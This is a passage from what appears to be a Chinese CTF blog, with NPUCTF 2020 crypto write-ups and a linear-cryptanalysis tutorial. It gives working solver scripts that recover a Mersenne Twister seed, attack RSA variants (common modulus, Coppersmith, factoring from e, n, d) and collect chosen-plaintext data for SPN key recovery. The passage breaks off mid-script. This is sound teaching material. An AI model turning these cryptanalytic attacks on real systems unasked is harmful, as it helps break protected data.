class="number">1</span>)])</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">        prefix_mt_output.append(bytes_to_long(randnum[<span class="number">4</span> * k : <span class="number">4</span> * (k + <span class="number">1</span>)]))</span><br><span class="line">    j += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># In[5]:</span></span><br><span class="line">suffix_mt_output = [] <span class="comment">#output[100]~output[103]</span></span><br><span class="line">suffix = <span class="string">b'&#125;'</span></span><br><span class="line">tmp = md5(suffix).digest()</span><br><span class="line">randnum = XOR(tmp, cipher[<span class="number">16</span> * <span class="number">25</span> : <span class="number">16</span> * <span class="number">26</span>])</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">    suffix_mt_output.append(bytes_to_long(randnum[<span class="number">4</span> * i : <span class="number">4</span> * (i + <span class="number">1</span>)]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># In[6]:</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">unBitshiftLeftXor</span><span class="params">(value, shift, mask)</span>:</span></span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    res = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i * shift &lt; <span class="number">32</span>:</span><br><span class="line">        partMask = (<span class="number">0xffffffff</span> &gt;&gt; (<span class="number">32</span> - shift)) &lt;&lt; (shift * i)</span><br><span class="line">        part = value &amp; partMask</span><br><span class="line">        value ^= (part &lt;&lt; shift) &amp; mask</span><br><span class="line">        res |= part</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">unBitshiftRightXor</span><span class="params">(value, shift, mask)</span>:</span></span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    res = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i * shift &lt; <span class="number">32</span>:</span><br><span class="line">        partMask = ((<span class="number">0xffffffff</span> &lt;&lt; (<span class="number">32</span> - shift)) &amp; <span class="number">0xffffffff</span>) &gt;&gt; (shift * i)</span><br><span class="line">        part = value &amp; partMask</span><br><span class="line">        value ^= (part &gt;&gt; shift) &amp; mask</span><br><span class="line">        res |= part</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">recoverState</span><span class="params">(value)</span>:</span></span><br><span class="line">    value = unBitshiftRightXor(value, <span class="number">18</span>, <span class="number">0x34adf670</span>)</span><br><span class="line">    value = unBitshiftLeftXor(value, <span class="number">15</span>, <span class="number">0xefc65400</span>)</span><br><span class="line">    value = unBitshiftLeftXor(value, <span class="number">7</span>, <span class="number">0x9ddf4680</span>)</span><br><span class="line">    value = unBitshiftRightXor(value, <span class="number">11</span>, <span class="number">0xffffffff</span>)</span><br><span class="line">    <span class="keyword">return</span> value</span><br><span class="line"></span><br><span class="line"><span class="comment"># In[7]:</span></span><br><span class="line">prefix_state = []</span><br><span class="line"><span class="keyword">for</span> value <span class="keyword">in</span> prefix_mt_output:</span><br><span class="line">    prefix_state.append(recoverState(value))</span><br><span class="line">suffix_state = [] <span class="comment">#state[100]~state[103]</span></span><br><span class="line"><span class="keyword">for</span> value <span class="keyword">in</span> suffix_mt_output:</span><br><span class="line">    suffix_state.append(recoverState(value))</span><br><span class="line"></span><br><span class="line"><span class="comment"># In[22]:</span></span><br><span class="line">cur = suffix_state[<span class="number">-1</span>] <span class="comment">#state[103]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># In[23]:</span></span><br><span class="line">cur ^= prefix_state[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># In[24]:</span></span><br><span class="line"><span class="keyword">if</span> size(cur) &gt; <span class="number">31</span>: <span class="comment">#最高比特一定要是0</span></span><br><span class="line">    print(<span class="string">"old_state[104] &amp; 1 == 1"</span>)</span><br><span class="line">    cur ^= <span class="number">0x9908f23f</span> <span class="comment">#奇数</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    print(<span class="string">"old_state[104] &amp; 1 == 0"</span>) <span class="comment">#偶数</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># In[25]:</span></span><br><span class="line">cur &lt;&lt;= <span class="number">1</span> <span class="comment">#偶数末尾比特=0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># In[26]:</span></span><br><span class="line">s104_1 = cur &amp; <span class="number">0x7fffffff</span></span><br><span class="line">s104_2 = s104_1 | <span class="number">0x80000000</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># In[27]:</span></span><br><span class="line">coef = inverse(<span class="number">1812433253</span>, <span class="number">0x100000000</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">inv_srand</span><span class="params">(value, i)</span>:</span></span><br><span class="line">    value &amp;= <span class="number">0xffffffff</span></span><br><span class="line">    value += i</span><br><span class="line">    value *= coef</span><br><span class="line">    value = unBitshiftRightXor(value, <span class="number">27</span>, <span class="number">0xffffffff</span>)</span><br><span class="line">    <span class="keyword">return</span> value</span><br><span class="line"></span><br><span class="line"><span class="comment"># In[28]:</span></span><br><span class="line"><span class="keyword">if</span> inv_srand(s104_1, <span class="number">103</span>) &amp; <span class="number">0x80000000</span> == cur &amp; <span class="number">0x80000000</span>:</span><br><span class="line">    <span class="keyword">if</span> inv_srand(s104_2, <span class="number">103</span>) &amp; <span class="number">0x80000000</span> == cur &amp; <span class="number">0x80000000</span>:</span><br><span class="line">        print(<span class="string">"two cases found"</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        s104 = s104_1</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    s104 = s104_2</span><br><span class="line"></span><br><span class="line"><span class="comment"># In[29]:</span></span><br><span class="line">cur = s104</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">103</span>, <span class="number">-1</span>, <span class="number">-1</span>):</span><br><span class="line">    cur = inv_srand(cur, i)</span><br><span class="line">seed = cur</span><br><span class="line"></span><br><span class="line"><span class="comment"># In[30]:</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">mt73991</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self , seed)</span>:</span></span><br><span class="line">        self.state = [seed] + [<span class="number">0</span>] * <span class="number">232</span></span><br><span class="line">        self.flag = <span class="number">0</span></span><br><span class="line">        self.srand()</span><br><span class="line">        self.generate()</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">srand</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">232</span>):</span><br><span class="line">            self.state[i+<span class="number">1</span>] = <span class="number">1812433253</span> * (self.state[i] ^ (self.state[i] &gt;&gt; <span class="number">27</span>)) - i</span><br><span class="line">            self.state[i+<span class="number">1</span>] &amp;= <span class="number">0xffffffff</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">generate</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">233</span>):</span><br><span class="line">            y = (self.state[i] &amp; <span class="number">0x80000000</span>) | (self.state[(i+<span class="number">1</span>)%<span class="number">233</span>] &amp; <span class="number">0x7fffffff</span>)</span><br><span class="line">            temp = y &gt;&gt; <span class="number">1</span></span><br><span class="line">            temp ^= self.state[(i + <span class="number">130</span>) % <span class="number">233</span>]</span><br><span class="line">            <span class="keyword">if</span> y &amp; <span class="number">1</span>:</span><br><span class="line">                temp ^= <span class="number">0x9908f23f</span></span><br><span class="line">            self.state[i] = temp</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">getramdanbits</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> self.flag == <span class="number">233</span>:</span><br><span class="line">            self.generate()</span><br><span class="line">            self.flag = <span class="number">0</span></span><br><span class="line">        bits = self.Next(self.state[self.flag]).to_bytes(<span class="number">4</span> , <span class="string">'big'</span>)</span><br><span class="line">        self.flag += <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> bits</span><br><span class="line">        </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Next</span><span class="params">(self , tmp)</span>:</span></span><br><span class="line">        tmp ^= (tmp &gt;&gt; <span class="number">11</span>)</span><br><span class="line">        tmp ^= (tmp &lt;&lt; <span class="number">7</span>) &amp; <span class="number">0x9ddf4680</span></span><br><span class="line">        tmp ^= (tmp &lt;&lt; <span class="number">15</span>) &amp; <span class="number">0xefc65400</span></span><br><span class="line">        tmp ^= (tmp &gt;&gt; <span class="number">18</span>) &amp; <span class="number">0x34adf670</span></span><br><span class="line">        <span class="keyword">return</span> tmp</span><br><span class="line"></span><br><span class="line"><span class="comment"># In[31]:</span></span><br><span class="line">random = mt73991(seed)</span><br><span class="line"></span><br><span class="line"><span class="comment"># In[32]:</span></span><br><span class="line">pt = <span class="string">b''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">26</span>):</span><br><span class="line">    key = <span class="string">b''</span>.join([random.getramdanbits() <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">4</span>)])</span><br><span class="line">    pt += XOR(key, cipher[<span class="number">16</span> * i : <span class="number">16</span> * (i + <span class="number">1</span>)])</span><br><span class="line"></span><br><span class="line"><span class="comment"># In[33]:</span></span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">str_set = string.printable.encode()</span><br><span class="line">md5_set = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> str_set:</span><br><span class="line">    md5_set.append(md5(chr(i).encode()).digest())</span><br><span class="line"></span><br><span class="line"><span class="comment"># In[34]:</span></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">26</span>):</span><br><span class="line">    idx = md5_set.index(pt[<span class="number">16</span> * i:<span class="number">16</span> * (i + <span class="number">1</span>)])</span><br><span class="line">    flag += chr(str_set[idx])</span><br><span class="line">flag</span><br></pre></td></tr></table></figure><h4 id="more-1">[More]</h4><p>解<code>old_state[103]</code>那里采用z3解方程失败（原因是Int类型不支持位运算，但BitVec('s103', 32)又是在<span class="math inline">\(GF(2^{32})\)</span>上的元，基础运算定义不一致，求解结果错误）</p><p>因此采用了手动解方程的办法，后续如果知道有轮子再补</p><h3 id="共模攻击">共模攻击</h3><h4 id="题目考点-2">[题目考点]</h4><ul><li>共模攻击</li><li>有限域开根</li><li>CopperSmith</li></ul><h4 id="题目文件-2">[题目文件]</h4><p><a href="ezrsa_c799462e82d9c969f1d28a373733e6f1.zip.zip">Click Here to Download</a></p><h4 id="题解分析-2">[题解分析]</h4><p>hint.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">m = bytes_to_long(hint)</span><br><span class="line">p = getPrime(<span class="number">256</span>)</span><br><span class="line">c = pow(m, <span class="number">256</span>, p)</span><br><span class="line">print(p)</span><br><span class="line">...</span><br><span class="line"><span class="comment"># c可以通过真·共模求出来</span></span><br></pre></td></tr></table></figure><p>256非素数，懒得自己写有限域开根高效算法了...sage直接来</p><p><img src= "/img/loading.gif" data-src="/2020/04/19/WriteUp-NPUCTF-Crypto/Snipaste_2020-04-21_21-49-44.png"></p><p>再回到task.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">p, q = getPrime(<span class="number">512</span>), getPrime(<span class="number">512</span>)</span><br><span class="line">n = p * q</span><br><span class="line">e1, e2 = p, q</span><br><span class="line">c1, c2 = pow(m, e1, n), pow(m, e2, n)</span><br><span class="line"></span><br><span class="line">print(n)</span><br><span class="line">print(c1)</span><br><span class="line">print(c2)</span><br></pre></td></tr></table></figure><p>hint给出m比特长度上界，联想到coppersmith，再可行性分析如下：</p><p><span class="math inline">\(c1\equiv m^{p}\equiv m(mod\ p),c2\equiv m^{q}\equiv m(mod\ q)\)</span></p><p><span class="math inline">\(\therefore n|(c1-m)(c2-m)\)</span></p><p>上界分析<span class="math inline">\(\frac{1}{2}n^{\frac{1^{2}}{2}}\approx 2^{511}\)</span>，而上面hint已经给了size(m)&lt;400，所以可行性分析通过</p><p><img src= "/img/loading.gif" data-src="/2020/04/19/WriteUp-NPUCTF-Crypto/Snipaste_2020-04-21_21-58-34.png"></p><h4 id="exp-2">[exp]</h4><p>没完整的- -按上面的截图手动测就好</p><h4 id="more-2">[More]</h4><p>coin师傅还是强啊quq</p><h3 id="ezrsa">EzRSA</h3><h4 id="题目考点-3">[题目考点]</h4><ul><li>已知(e, n, d)恢复(p, q)</li><li>Rabin解密</li></ul><h4 id="题目文件-3">[题目文件]</h4><p><a href="difficultrsa.py">Click Here to Download</a></p><h4 id="题解分析-3">[题解分析]</h4><p>题目给出<code>n</code>，<code>lcm(p-1,q-1)</code>，<code>c</code>，<code>e</code>，测试发现<code>GCD(e, lcm) == 2</code></p><p>因此令<code>d=inverse(e//2,lcm)</code>，则<span class="math inline">\(m^{2}\equiv c^{d}(mod\ n)\)</span></p><p>但非有限域下的二次根求解难度在m足够大的时候几乎不可行，于是思路转向分解n</p><p>比赛的时候发现<code>size(lcm) == 2045</code>，也就是说<code>GCD(p-1,q-1)</code>极小，爆破小素数组合即可，发现GCD为8</p><p>成功分解N，求解Rabin即可（当然，这是非预期...shallow师傅后来提了一下才反应过来，这道题考察的点实际上是已知(e, n, d)来分解n）</p><p>关于已知(e, n, d)分解N，我在之前的博客也提到过<a href="http://0xdktb.top/2020/02/28/Summary-of-Crypto-in-CTF-RSA/#rsa---given-e-d-n">http://0xdktb.top/2020/02/28/Summary-of-Crypto-in-CTF-RSA/#rsa---given-e-d-n</a></p><h4 id="exp-3">[exp]</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> next_prime, gcd</span><br><span class="line"><span class="keyword">import</span> sympy</span><br><span class="line"></span><br><span class="line">lcm = </span><br><span class="line">e = </span><br><span class="line"><span class="keyword">assert</span>(GCD(lcm, e) == <span class="number">2</span>)</span><br><span class="line">n = </span><br><span class="line">d = inverse(e // <span class="number">2</span>, lcm)</span><br><span class="line">m2 = pow(c, d, n) <span class="comment"># m^2</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Factorize</span><span class="params">(n, e, d)</span>:</span></span><br><span class="line">    g = <span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        k = e * d - <span class="number">1</span></span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">not</span> k &amp; <span class="number">1</span>:</span><br><span class="line">            k //= <span class="number">2</span></span><br><span class="line">            p = int(gcd(pow(g, k, n) - <span class="number">1</span>, n)) % n</span><br><span class="line">            <span class="keyword">if</span> p &gt; <span class="number">1</span>:</span><br><span class="line">                <span class="keyword">return</span> (p, n // p)</span><br><span class="line">        g = int(next_prime(g))</span><br><span class="line">        </span><br><span class="line">(p, q) = Factorize(n, e // <span class="number">2</span>, d)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 下面求解Rabin是用sage手动测的，如果想合成完整脚本的话请用求解Rabin的脚本(多种可能要进行筛选)</span></span><br><span class="line">m_p = sympy.nthroot_mod(m2, <span class="number">2</span>, p)</span><br><span class="line">m_q = sympy.nthroot_mod(m2, <span class="number">2</span>, q)</span><br><span class="line">m = crt([m_p, m_q], [p, q])</span><br><span class="line">long_to_bytes(m)</span><br><span class="line"></span><br><span class="line"><span class="comment"># b'NPUCTF&#123;diff1cult_rsa_1s_e@sy&#125;'</span></span><br></pre></td></tr></table></figure><h3 id="ezlcg">EzLCG</h3><h4 id="出题手记">[出题手记]</h4><p><a href="EzLCG.pdf">Click Here to Download</a></p><h3 id="ezspn">EzSPN</h3><h4 id="出题手记-1">[出题手记]</h4><p><a href="EzSPN.pdf">Click Here to Download</a></p>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Summary-of-Crypto-in-CTF(Block)</title>
      <link href="/2020/04/11/Summary-of-Crypto-in-CTF-Block/"/>
      <url>/2020/04/11/Summary-of-Crypto-in-CTF-Block/</url>
      
        <content type="html"><![CDATA[<h3 id="feistel-sp结构">Feistel-SP结构</h3><p>下图即为Feistel-SP结构的通用模型，其中F函数是SP结构</p><p><img src= "/img/loading.gif" data-src="/2020/04/11/Summary-of-Crypto-in-CTF-Block/Snipaste_2020-07-09_13-55-29.png"></p><p>注：<span class="math inline">\(X_{i}^{1}\)</span>和<span class="math inline">\(Y_{i}^{1}\)</span>分别表示<strong>通过<span class="math inline">\(S_{1}\)</span>的输入和输出向量</strong>，<span class="math inline">\(X_{i}^{j},Y_{i}^{j}\)</span>类似.</p><h3 id="线性分析">线性分析</h3><h4 id="theorem">Theorem</h4><p>基本方法即为寻找一个给定密码系统下，具有如下形式的有效线性表达式 <span class="math display">\[P[i_{1},...,i_{a}]\oplus C[j_{1},...,j_{b}]=K[k_{1},...,k_{c}]\]</span> (<span class="math inline">\(i_{1},...,i_{a};j_{1},...,j_{b};k_{1},...,k_{c}\)</span>均为固定比特位)</p><p>设<span class="math inline">\(X_{1},X_{2},...,X_{k}\)</span>为<span class="math inline">\(\{0,1\}\)</span>上的独立随机变量，<span class="math inline">\(Pr(X_{i}=0)=p_{i},Pr(X_{i}=1)=1-p_{i}\)</span>，则用分布偏差来表示其概率分布，定义如下 <span class="math display">\[\epsilon_{i}=p_{i}-\frac{1}{2}\]</span> [堆积引理] - <span class="math inline">\(Pr(X_{1}\oplus ...\oplus X_{n}=0)=\frac{1}{2}+2^{n-1}\prod_{i=1}^{n}\epsilon_{i}\)</span>，或表示为<span class="math inline">\(\epsilon_{1,2,...,n}=2^{n-1}\prod_{i=1}^{n}\epsilon_{i}\)</span>.</p><p>利用堆积引理，我们即可以对每轮变换中偏差最大的线性逼近式进行组合，组合后的线性逼近式也将拥有最佳的偏差，即为要找的最佳线性逼近式</p><p>[SPN]</p><p>下为单轮SPN的示意图</p><p><img src= "/img/loading.gif" data-src="/2020/04/11/Summary-of-Crypto-in-CTF-Block/Snipaste_2020-04-11_23-20-06.png"></p><p>可见非线性结构只有S盒，因此只对其作偏差估计，具体方法如下（假设S盒为16*16）：</p><p>将输入的线性近似表示为<span class="math inline">\(a_{1}\cdot X_{1}\oplus a_{2}\cdot X_{2}\oplus ...\oplus a_{8}\cdot X_{8}(a_{i}\in \{0,1\})\)</span>，对应的，我们也将输出线性近似表示为<span class="math inline">\(b_{1}\cdot Y_{1}\oplus b_{2}\cdot Y_{2}\oplus ...\oplus b_{8}\cdot Y_{8}(b_{i}\in \{0,1\})\)</span>，穷举所有组合<span class="math inline">\((a,b)\)</span>对应的使得线性近似输入<span class="math inline">\(\oplus\)</span>线性近似输出=0的偏差 (256*256)</p><p>偏差计算公式<span class="math inline">\(\epsilon(a,b)=(N_{L}(a,b)-128)/256\)</span>（<span class="math inline">\(N_{L}(a,b)\)</span>为固定(a,b)下，满足上述条件的(X,Y)的个数）</p><p>我们的目的就是要找到<span class="math inline">\(|\epsilon(a,b)|_{max}\)</span>对应的线性表达式，将其作为该单个S盒下的最佳线性估计</p><p>以下面的SPN网络进行讨论分析：</p><p><img src= "/img/loading.gif" data-src="/2020/04/11/Summary-of-Crypto-in-CTF-Block/QQ图片20200412233456.jpg"></p><p>中间的P盒如下： <span class="math display">\[\left[\begin{matrix}1 &amp; 9 &amp; 17 &amp; 25 &amp; 33 &amp; 41 &amp; 49 &amp; 57\\2 &amp; 10 &amp; 18 &amp; 26 &amp; 34 &amp; 42 &amp; 50 &amp; 58\\... &amp; ... &amp; ... &amp; ... &amp; ... &amp; ... &amp; ... &amp; ...\\8 &amp; 16 &amp; 24 &amp; 32 &amp; 40 &amp; 48 &amp; 56 &amp; 64\end{matrix}\right]\]</span> 为方便分析，我们假设<span class="math inline">\(S_{11}=S_{12}=...=S_{18}\)</span>，在找合适的线性逼近前，我们要知道以下两点：</p><ul><li>每个线性逼近对应的密钥子集猜测空间不能过大（这里我们使得每个线性逼近表达式里的<span class="math inline">\(C_{i}\)</span>满足<span class="math inline">\(8j&lt; i\leq 8(j+1)\)</span>，j在每次猜测下各自固定）</li><li>涉及线性估计的S盒不能过多（堆积引理<span class="math inline">\(\epsilon_{1,2,...,n}=2^{n-1}\prod_{i=1}^{n}\epsilon_{i}\)</span>可知，总偏移量的绝对值会随着n的增大而减小，总偏移量过小会使得在猜测密钥时的成功率极低）</li></ul><p>因此我们选择分别对应<span class="math inline">\(S_{11}\)</span>八个输出的八个<span class="math inline">\(S_{11}\)</span>的最大偏差线性估计，来进行八个第二轮子密钥的猜测（基于不正确的随机密钥会使得测试的明密文对中，满足线性表达式的概率趋于<span class="math inline">\(\frac{1}{2}\)</span>，即偏差减小），总的猜测空间为256*8</p><p>以<span class="math inline">\(K_{2,1},K_{2,2},...,K_{2,8}\)</span>为例，取<span class="math inline">\(u_{1}\)</span>为<span class="math inline">\(S_{21}^{-1}(C_{1}\oplus K_{2,1}||C_{2}\oplus K_{2,2}||...||C_{8}\oplus K_{2,8})\)</span>的最高位比特</p><p>从上述S盒的分析得出<span class="math inline">\(S_{11}\)</span>固定<span class="math inline">\(b=10000000\)</span>时，最大偏差线性估计对应的<span class="math inline">\(a(a_{1}a_{2}a_{3}a_{4}a_{5}a_{6}a_{7}a_{8})\)</span>，因为<span class="math inline">\(K_{1,i}s\)</span>异或为定值(0/1)，故不予加入线性表达式，<span class="math inline">\(u_{2}\)</span>取为<span class="math inline">\(P_{a_{i}}s\)</span>的异或<span class="math inline">\((a_{i}均等于1)\)</span></p><p>密钥空间为256，且每次取相同10000组数据进行线性分析，则假设使得<span class="math inline">\(u_{1}\oplus u_{2}=0\)</span>成立的组数为N，<span class="math inline">\(bias=|\frac{N-5000}{10000}|\)</span>，很大概率下，<span class="math inline">\(bias_{max}\)</span>对应的即为正确密钥</p><p>第二轮子密钥完全恢复后，任取一组明密文对即可轻易恢复第一轮子密钥，线性分析结束</p><h4 id="exp">exp</h4><p>以NPUCTF2020出的EzSPN为例</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os, sys</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> hexlify, unhexlify</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">SZ = <span class="number">8</span></span><br><span class="line">offset = [[<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>)] <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>)]  <span class="comment">#Sbox线性估计offset</span></span><br><span class="line">linearInput = []</span><br><span class="line">sbox, sboxi, plain, cipher = [], [], [], []</span><br><span class="line">enc_flag = <span class="literal">None</span></span><br><span class="line">coef = [<span class="number">15</span>, <span class="number">11</span>, <span class="number">155</span>, <span class="number">119</span>, <span class="number">11</span>, <span class="number">99</span>, <span class="number">83</span>, <span class="number">249</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getData</span><span class="params">(ip, port)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> enc_flag, sbox, sboxi</span><br><span class="line">    io = remote(ip, port)</span><br><span class="line">    sbox_str = io.recvline()</span><br><span class="line">    sbox = eval(sbox_str)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">    sboxi.append(sbox.index(i))</span><br><span class="line">    enc_flag = io.recvline().strip().decode(<span class="string">"utf8"</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10000</span>):</span><br><span class="line">        print(<span class="string">"[+] Getting data...(&#123;&#125;/10000)"</span>.format(i))</span><br><span class="line">        pt = hexlify(os.urandom(<span class="number">8</span>)).decode(<span class="string">"utf8"</span>)</span><br><span class="line">        plain.append(pt)</span><br><span class="line">        io.sendline(pt)</span><br><span class="line">        ct = io.recvline().strip().decode(<span class="string">"utf8"</span>)</span><br><span class="line">        cipher.append(ct)</span><br><span class="line">    io.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">doxor</span><span class="params">(l1, l2)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> [x[<span class="number">0</span>] ^ x[<span class="number">1</span>] <span class="keyword">for</span> x <span class="keyword">in</span> zip(l1, l2)]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 线性层</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">trans</span><span class="params">(blk)</span>:</span></span><br><span class="line">    res = []</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">0</span>, SZ, <span class="number">8</span>):</span><br><span class="line">        cur = blk[k:k+<span class="number">8</span>]</span><br><span class="line">        cur = [(cur[i] * coef[i]) % <span class="number">256</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>)]</span><br><span class="line">        bits = [bin(x)[<span class="number">2</span>:].rjust(<span class="number">8</span>, <span class="string">'0'</span>) <span class="keyword">for</span> x <span class="keyword">in</span> cur]</span><br><span class="line">        bits = bits[<span class="number">-1</span>:] + bits[:<span class="number">-1</span>]</span><br><span class="line">        <span class="keyword">for</span> 